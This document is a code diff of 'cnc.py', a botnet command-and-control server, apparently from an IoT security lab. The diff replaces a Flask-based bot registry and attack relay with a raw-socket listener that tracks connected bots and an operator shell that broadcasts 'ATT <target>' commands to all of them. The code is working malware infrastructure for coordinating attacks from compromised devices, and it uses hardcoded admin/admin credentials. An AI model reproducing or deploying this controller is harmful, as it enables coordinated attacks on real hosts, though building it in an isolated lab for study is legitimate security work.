@@ -1,56 +1,96 @@
 # cnc.py
-from flask import Flask,request,jsonify, Response
+import socket
+import threading
 import requests
 
-REPORT_SERVER = "http://report:5000" 
+REPORT_SERVER = "http://10.10.10.100:5000"
 
-app = Flask(__name__)
+CNC_IP = "0.0.0.0" #"10.10.10.100"
+CNC_PORT = 5002
 
-bots=[]
+ATTACKER_USER = "admin"
+ATTACKER_PASS = "admin"
 
-ATTACKER_USER = ""
-ATTACKER_PASS = ""
+bots = []
 
-@app.route("/bots")
-def get_devices():
-    return {"bots":bots}
-    
-# register iot devices
-@app.route("/register", methods=["POST"])
-def register():
-    data = request.json
-    bot_ip = data.get("ip")
-    
-    if bot_ip not in bots:
-        bots.append(bot_ip)
-        print(f"Bot registered: {bot_ip}", flush = True)
-    
-    return {"status":"ok"}
-    
+# BOt handle
+def handle_bot(conn, addr):
+    print(f"[+] Bot connected from {addr}")
+    bots.append(conn)
 
-# attack
-@app.route("/attack", methods=["POST"])
+    try:
+        while True:
+            data = conn.recv(1024)
+            if not data:
+                break
+
+            print(f"[BOT {addr}] {data.decode().strip()}")
+
+    except Exception as e:
+        print(f"[-] Bot error: {e}")
+
+    finally:
+        print(f"[-] Bot disconnected {addr}")
+        bots.remove(conn)
+        conn.close()
+
+
+def start_server():
+    s = socket.socket()
+    s.bind((CNC_IP, CNC_PORT))
+    s.listen()
+
+    print(f"[CNC] Listening on {CNC_IP}:{CNC_PORT}")
+
+    while True:
+        conn, addr = s.accept()
+        threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()
+
+
+# LOGIN 
+def login():
+    user = input("Username: ")
+    pwd = input("Password: ")
+
+    if user == ATTACKER_USER and pwd == ATTACKER_PASS:
+        print("[+] Login successful")
+        return True
+    else:
+        print("[-] Invalid credentials")
+        return False
+
+
+# INVIO ATTACCO
 def launch_attack():
-    devices = get_devices().get("bots",[])
-    if not devices:
-        return {"status": "no bots"}
-    
-    data = request.json
-    target = data.get("target")
-    results = []
-    
-    print(f"the target is {target}")
-    print(f"Bots: {devices}")
-    
-    for d in devices:
+    target = input("Target IP: ")
+
+    print(f"[CNC] Sending attack to {len(bots)} bots")
+
+    for bot in bots:
         try:
-            requests.post(f"http://{d}:8000/attack",json={"target": target})
-            results.append({d:"ok"})
+            bot.send(f"ATT {target}\n".encode())
         except:
-            results.append({d:"attack failed from the bot"})
-    return results
-    
-    
-app.run(host="0.0.0.0", port=5002,debug = True)
+            print("[-] Failed to send to a bot")
 
 
+# MAIN ATTACK LOOP
+def attacker_shell():
+    while True:
+        cmd = input("CNC> ")
+
+        if cmd == "attack":
+            launch_attack()
+        elif cmd == "list":
+            print(f"Connected bots: {len(bots)}")
+        elif cmd == "exit":
+            break
+        else:
+            print("Commands: attack, list, exit")
+
+
+
+if __name__ == "__main__":
+    start_server()
+
+    #if login():
+   #     attacker_shell()
